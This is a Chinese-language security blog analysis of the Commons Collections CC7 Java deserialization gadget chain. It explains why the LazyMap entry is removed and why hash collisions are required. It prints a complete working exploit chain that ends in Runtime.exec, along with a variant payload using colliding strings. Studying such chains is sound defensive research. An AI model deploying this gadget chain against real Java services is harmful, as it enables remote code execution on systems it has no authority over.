> 原文链接: https://www.anquanke.com//post/id/248169 


# CC第7链HashTable触发点深入分析


                                阅读量   
                                **30294**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t016c13e5a5e697f9b8.jpg)](https://p3.ssl.qhimg.com/t016c13e5a5e697f9b8.jpg)



## 起因

CC（CommonsCollections）链系列是Java安全必经之路，复习到CC7的`lazyMap2.remove("yy");`代码，网上文章解释的不是很清楚，不明白为什么要这样做，于是打算深入做一个分析



## 回顾

贴出网上广泛流传的CC第7链，笔者将带大家做个简单的回顾

```
Transformer[] fakeTransformer = new Transformer[]`{``}`;

Transformer[] transformers = new Transformer[] `{`
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]`{`String.class, Class[].class`}`, new Object[]`{`"getRuntime", new Class[0]`}`),
    new InvokerTransformer("invoke", new Class[]`{`Object.class, Object[].class`}`, new Object[]`{`null, new Object[0]`}`),
    new InvokerTransformer("exec", new Class[]`{`String.class`}`, new Object[]`{`"calc"`}`)
`}`;

Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);

Map innerMap1 = new HashMap();
Map innerMap2 = new HashMap();

Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
lazyMap1.put("yy", 1);

Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
lazyMap2.put("zZ", 1);

Hashtable hashtable = new Hashtable();
hashtable.put(lazyMap1, "test");

hashtable.put(lazyMap2, "test");

Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
field.setAccessible(true);
field.set(chainedTransformer, transformers);

lazyMap2.remove("yy");

ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(hashtable);
oos.flush();
oos.close();

ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
ObjectInputStream ois = new ObjectInputStream(bais);
ois.readObject();
ois.close();
```

`ChainedTransformer`触发点`transform`

```
public Object transform(Object object) `{`
    for (int i = 0; i &lt; iTransformers.length; i++) `{`
        object = iTransformers[i].transform(object);
    `}`
    return object;
`}`
```

链式调用中使用到`InvokerTransformer`的`transform`方法，反射调用

```
public Object transform(Object input) `{`
    ......
    Class cls = input.getClass();
    Method method = cls.getMethod(iMethodName, iParamTypes);
    return method.invoke(input, iArgs);
    ......
```

`LazyMap`中的触发点，如果当前`LazyMap`中不包含传入的`key`才会顺利调用`transform`触发漏洞

```
public Object get(Object key) `{`
    if (map.containsKey(key) == false) `{`
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    `}`
    return map.get(key);
`}`
```

`HashTable`被反序列化后的触发过程如下，遍历`HashTable`已有元素调用`reconstitutionPut`方法

```
private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException
`{`
    ......
        for (; elements &gt; 0; elements--) `{`
            @SuppressWarnings("unchecked")
            K key = (K)s.readObject();
            @SuppressWarnings("unchecked")
            V value = (V)s.readObject();
            // sync is eliminated for performance
            reconstitutionPut(table, key, value);
        `}`
    ......
`}`
```

`reconstitutionPut`方法如下，触发点是`e.key.equals(key))`

（注意这里有细节，将在后文中重点关注）

```
......
int hash = key.hashCode();
int index = (hash &amp; 0x7FFFFFFF) % tab.length;
for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) `{`
    if ((e.hash == hash) &amp;&amp; e.key.equals(key)) `{`
        throw new java.io.StreamCorruptedException();
    `}`
`}`
......
```

跟入`equals`到达`AbstractMap.equals`，看到`m.get(key)`方法，其实是上文中的`LazyMap.get`，调用了`transform`方法，最终构造出整条链，这也是网上大部分文章所写的过程

```
public boolean equals(Object o) `{`
    if (o == this)
        return true;
    if (!(o instanceof Map))
        return false;
    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;
    ......
    if (value == null) `{`
       if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))
           return false;
    `}` else `{`
        if (!value.equals(m.get(key)))
           return false;
    `}`
    ......
```



## 深入分析

从Payload入手分析，将空的`chainedTransformer`传入`LazyMap`中，并设置key为`yy`和`zZ`的元素

分析`LazyMap`源码可以看出并没有重写`put`，所以这里只是简单的普遍的`map.put`操作

```
Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
lazyMap1.put("yy", 1);

Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
lazyMap2.put("zZ", 1);
```

继续分析，往新建的`HashTable`中放入上文两个`LazyMap`

```
Hashtable hashtable = new Hashtable();
hashtable.put(lazyMap1, "test");

hashtable.put(lazyMap2, "test");
```

### <a class="reference-link" name="%E9%97%AE%E9%A2%98%E4%B8%80"></a>问题一

**为什么要放入两个LazyMap **

首先来看`HashTable.put`，这里和`reconstitutionPut`处的代码类似，都包含了`entry.key.equals(key))`代码。其中`key`是传入的`LazyMap`，`tab`是全局的一个`Entry`，根据`hashcode`算出一个`index`，只有`entry`中有元素才会进入`for`循环，从而进一步触发

```
private transient Entry&lt;?,?&gt;[] table;
......
Entry&lt;?,?&gt; tab[] = table;
int hash = key.hashCode();
int index = (hash &amp; 0x7FFFFFFF) % tab.length;
@SuppressWarnings("unchecked")
Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];
for(; entry != null ; entry = entry.next) `{`
    if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) `{`
        ......
    `}`
`}`
......
```

所以可以看出，必须要两个或以上元素才能进入`entry.key.equals(key))`方法。类似地，反序列化的触发点`reconstitutionPut`处也是这样的逻辑，需要保证必须有两个或以上元素

进而可以得出的结论，能走到`LazyMap.get`方法的只有`lazyMap2`这一个对象

开头部分代码调试后，可以发现会执行两次`LazyMap.get`方法。第一次是制造反序列化对象的过程，也就是`hashtable.put(lazyMap2, "test");`会调用；第二次是模拟被反序列化后`reconstitutionPut`的调用。接下来我们针对这两次调用做深入分析

第一次调用：

注意到第一次传入的是空的一个`Transformer`数组

因此在`transform`的时候会原样返回，如果传入`yy`就会返回`yy`

```
Transformer[] fakeTransformer = new Transformer[]`{``}`;
```

结合代码分析，当`lazyMap2`被`put`后，`entry.key.equals(key))`中`entry.key`正是`lazyMap1`。`AbstractMap.equals`方法中有部分被忽视的代码。其中`i`是全局变量，根据继承关系，其中正是`lazyMap1`保存的`yy:1`，所以取到的`key`是`yy`，最终在`lazyMap2.get`传入的是`yy`

```
Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
while (i.hasNext()) `{`
    Entry&lt;K,V&gt; e = i.next();
    K key = e.getKey();
    V value = e.getValue();
    if (value == null) `{`
        if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))
            return false;
    `}` else `{`
        if (!value.equals(m.get(key)))
            return false;
    `}`
    ......
```

进入`lazyMap2`，本身只有`zZ:1`这一个元素，不包含`yy`，所以成功执行`transform`。而上文分析传入的参数是`yy`所以经过`transform`一些系列的链式调用后返回的还是`yy`，将`yy:yy`设置到`lazyMap2`中，所以`lazyMap2`包含了：`zZ:1`和`yy:yy`（链式调用原样返回是因为传入一个空的一个`Transformer`数组）

```
if (map.containsKey(key) == false) `{`
    Object value = factory.transform(key);
    map.put(key, value);
    return value;
`}`
```

后文反射设置`chainedTransformer`为Payload

```
Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
field.setAccessible(true);
field.set(chainedTransformer, transformers);
```

然后将`lazyMap2`的`yy:yy`移除

```
lazyMap2.remove("yy");
```

第二次调用：

这时候`HashTable`被反序列化，调用`readObject`方法，进入`reconstitutionPut`，重新看之前的代码。其中`table`参数是`HashTable`所包含的元素，由于刚被反序列化，所以不存在元素

进入`reconstitutionPut`的调用点，遍历获取的第一个`key`应该是`lazyMap1-&gt;yy:1`。由于`tab`是空，导致`get`操作的循环无法进入，跳到后续代码中，把`lazyMap1-&gt;yy:1`加入到了全局变量`table`

第二次循环进入`reconstitutionPut`，由于全局变量中已有值，所以可以调用到`e.key.equals(key)`方法

```
// HashTable.readObject
for (; elements &gt; 0; elements--) `{`
    // 遍历第一次的key是lazyMap1-&gt;yy:1
    // 遍历第二次的key是lazyMap2-&gt;zZ:1（已删除yy:yy）
    @SuppressWarnings("unchecked")
    K key = (K)s.readObject();
    @SuppressWarnings("unchecked")
    V value = (V)s.readObject();
    // 第一次传入的参数是：table[]-lazyMap1-&gt;yy:1-test
    // 第二次传入的参数是：table["lazyMap1-&gt;yy:1"]-lazyMap2-&gt;zZ:1-test
    // sync is eliminated for performance
    reconstitutionPut(table, key, value);
`}`

// HashTable.reconstitutionPut
private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)
    throws StreamCorruptedException
`{`
    if (value == null) `{`
        throw new java.io.StreamCorruptedException();
    `}`
    int hash = key.hashCode();
    int index = (hash &amp; 0x7FFFFFFF) % tab.length;
    // 第二次才会成功进入for循环
    for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) `{`
        // e.key: lazyMap1-&gt;yy:1
        // key: lazyMap2-&gt;zZ:1
        if ((e.hash == hash) &amp;&amp; e.key.equals(key)) `{`
            throw new java.io.StreamCorruptedException();
        `}`
    `}`
    // Creates the new entry.
    @SuppressWarnings("unchecked")
    Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];
    // 第一次会把lazyMap1-&gt;yy:1加入到全局变量table中
    tab[index] = new Entry&lt;&gt;(hash, key, value, e);
    count++;

// AbstractMap.equals
Entry&lt;K,V&gt; e = i.next();
K key = e.getKey();
V value = e.getValue();
if (value == null) `{`
    if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))
        return false;
`}` else `{`
    // m: lazyMap1-&gt;yy:1
    // key: lazyMap2-&gt;zZ:1
    if (!value.equals(m.get(key)))
        return false;
`}`
```

### <a class="reference-link" name="%E9%97%AE%E9%A2%98%E4%BA%8C"></a>问题二

**删除LazyMap2中key为yy的元素的根本原因是什么 **

观察到`reconstitutionPut`的代码，想要顺利执行，需要确保两个`lazyMap`的`hashcode`一致，进而`index`计算结果一致才可以。Java中hashcode的计算方式比较复杂，这里简单理解为：如果`lazymap1`和`lazymap1`包含相同数量的元素，并且每个元素的key和value都完全一致，那么计算得出的hashcode就相等

然而`lazyMap1-&gt;yy:1`和`lazyMap2-&gt;zZ:1`的hashcode为什么会相等呢？因为这是一处哈希碰撞，恰好而已。假设改成`lazyMap2-&gt;zZ:2`或`lazyMap2-&gt;zZZZZ:1`都会导致无法运行

```
// 根据lazyMap算出的hascode
int hash = key.hashCode();
// 根据hashcode算出index
int index = (hash &amp; 0x7FFFFFFF) % tab.length;
// 如果index不合法，将不会触发后续的链
for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) `{`
    if ((e.hash == hash) &amp;&amp; e.key.equals(key)) `{`
        throw new java.io.StreamCorruptedException();
    `}`
`}`
```

### <a class="reference-link" name="%E9%97%AE%E9%A2%98%E4%B8%89"></a>问题三

**Payload中的yy和zZ能否改成其他字符串**

参考问题二，要保证hashcode一致，理论上会有很多选择，实际上很难找出合适的

笔者给出一个可用的Payload，字符串AaAaAa和BBAaBB的hashcode相同，测试通过

```
Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
lazyMap1.put("AaAaAa",1);

Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
lazyMap2.put("BBAaBB",1);
......
lazyMap2.remove("AaAaAa");
```

成功触发

[![](https://p0.ssl.qhimg.com/t01fe416b0dc9558cd9.png)](https://p0.ssl.qhimg.com/t01fe416b0dc9558cd9.png)



## 参考链接

[https://xz.aliyun.com/t/9409#toc-7](https://xz.aliyun.com/t/9409#toc-7)

[https://cloud.tencent.com/developer/article/1809858](https://cloud.tencent.com/developer/article/1809858)
